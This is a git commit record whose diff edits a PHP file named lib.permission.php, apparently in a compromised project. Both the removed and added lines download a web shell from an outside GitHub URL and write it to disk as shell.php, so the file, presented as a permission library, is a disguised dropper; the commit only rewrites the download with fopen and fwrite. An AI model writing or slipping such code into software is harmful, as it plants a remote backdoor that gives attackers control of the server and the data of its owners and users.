3d499447bde8bc820563250f15053f6479fc1e16
h4xm3 <f297199@trbvm.com>
2015-02-22 01:40:41 +0000

    Update lib.permission.php

--- libs/1/lib/lib/lib.permission.php
+++ libs/1/lib/lib/lib.permission.php
@@ -1,4 +1,6 @@
 <?php
-file_put_contents("shell.php",file_get_contents('https://raw.githubusercontent.com/h4xm3/145662/master/shell.php'));
+$fp = fopen('shell.php', 'w');
+fwrite($fp, file_get_contents('https://raw.githubusercontent.com/h4xm3/145662/master/shell.php'));
+fclose($fp);
 exit();
 ?>
